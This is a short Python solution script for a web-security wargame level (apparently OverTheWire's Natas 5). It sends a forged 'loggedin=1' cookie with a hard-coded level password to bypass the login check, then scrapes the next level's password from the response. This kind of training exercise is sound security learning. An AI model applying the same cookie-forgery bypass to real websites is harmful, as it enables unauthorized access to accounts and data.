# -*- coding: utf-8 -*-
from base import get_page
import re

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
cookies = {"loggedin": "1"}
content = get_page(5, username, password, cookies=cookies)
password = re.search(r"(?<=natas6 is )\w+", content)
if password is not None:
    print(password.group(0))
else:
    print("Fail to find password")
